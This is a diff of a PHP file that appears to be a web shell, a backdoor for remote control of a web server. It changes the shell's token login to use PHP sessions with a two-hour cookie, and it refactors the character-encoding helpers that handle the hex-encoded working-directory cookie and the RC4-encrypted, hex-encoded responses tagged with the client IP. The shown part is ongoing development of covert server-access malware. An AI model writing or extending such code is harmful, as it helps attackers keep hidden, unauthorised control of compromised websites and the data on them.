@@ -16,16 +16,33 @@ if(!function_exists('auth')){
 		if(isset($GLOBALS['token']) && (trim($GLOBALS['token'])!='')){
 			$c = $_COOKIE;
 			$p = $_POST;
+			$s = session_start();
 			if(isset($p['token'])){
 			    $token = cryptMyMd5($p['token'], explode('#', $GLOBALS['token'])[0]);
 				if($token==$GLOBALS['token']){
-					setcookie("token", $token, time()+36000, "/");
+                    if ($s) {
+                        $_SESSION['token'] = $token;
+                    }
+                    $c['token'] = $token;
+					setcookie('token', $token, time()+7200, '/');//2 hours
 					header("Location: ".get_self());
 				}
 			}
 
-			if(!isset($c['token']) || ((isset($c['token'])&&($c['token']!=$GLOBALS['token'])))){
+			$my = NULL;
+            if (isset($c['token'])) {
+                $my = $c['token'];
+            }
+            if (!$my && $s && isset($_SESSION['token'])) {
+                $my = $_SESSION['token'];
+                setcookie('token', $GLOBALS['token'], time()+7200, '/');//2 hours
+            }
+			if($my != $GLOBALS['token']){
 			    setcookie("cwd", null);
+                setcookie("token", null);
+                if ($s) {
+                    $_SESSION['token'] = null;
+                }
 				$res = "<!DOCTYPE html>
 		<html>
 		<head>
@@ -87,15 +104,6 @@ if(!function_exists('get_post')){
 	}
 }
 
-if(!function_exists('array_map_cb')) {
-    function array_map_cb($e){
-        if ((isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8')) {
-            $e = convert_encode('utf-8', $GLOBALS['encode'], $e);
-        }
-        return $e;
-    }
-}
-
 if(!function_exists('get_nav')){
 	function get_nav($path){
 		return parse_dir($path);
@@ -106,12 +114,11 @@ if(!function_exists('get_cwd')){
 	function get_cwd(){
 		$cwd = getcwd().DIRECTORY_SEPARATOR;
 		if(!isset($_COOKIE['cwd'])){
-			setcookie("cwd", encode_cwd($cwd));
+            $ec = encode_cwd($cwd);
+            $_COOKIE['cwd'] = $ec;
+			setcookie("cwd", $ec);
 		}else{
-			$cwd_c = rawurldecode(hex2bin($_COOKIE['cwd']));
-            if ((isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8')) {
-                $cwd_c = convert_encode('utf-8', $GLOBALS['encode'], $cwd_c);
-            }
+			$cwd_c = to_encode(rawurldecode(hex2bin($_COOKIE['cwd'])));
 			if(is_dir($cwd_c)) $cwd = realpath($cwd_c).DIRECTORY_SEPARATOR;
 			else setcookie("cwd", encode_cwd($cwd));
 		}
@@ -988,21 +995,17 @@ if(!function_exists('output')){
 	function output($str){
 		$error = @ob_get_contents();
 		@ob_end_clean();
-        if ((isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8')) {
-            $str = convert_encode($GLOBALS['encode'], 'utf-8', $str);
-        }
 		header("Content-Type: text/plain; charset=utf-8");
 		header("Cache-Control: no-cache");
 		header("Pragma: no-cache");
-		$str = @date("d M Y H:i:s",time()).'|'.$_SERVER['REMOTE_ADDR'].'|'.$str;
+		$str = @date("d M Y H:i:s",time()).'|'.$_SERVER['REMOTE_ADDR'].'|'.from_encode($str);
 		echo bin2hex(rc4($GLOBALS['cipher_key'], $str));
 		die();
 	}
 }
 
 if(!function_exists('convert_encode')) {
-	function convert_encode($from, $to, $txt)
-	{
+	function convert_encode($from, $to, $txt){
 		$ret = false;
 		if(function_exists("iconv")) {
 			$ret = @iconv($from, $to, $txt);
@@ -1011,6 +1014,24 @@ if(!function_exists('convert_encode')) {
 		}
 		return $ret === false ? $txt : $ret;
 	}
+}
+
+if(!function_exists('to_encode')) {
+    function to_encode($e){
+        if (isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8') {
+            return convert_encode('utf-8', $GLOBALS['encode'], $e);
+        }
+        return $e;
+    }
+}
+
+if(!function_exists('from_encode')) {
+    function from_encode($e){
+        if (isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8') {
+            return convert_encode($GLOBALS['encode'], 'utf-8', $e);
+        }
+        return $e;
+    }
 }
 
 if ( !function_exists( 'hex2bin' ) ) {
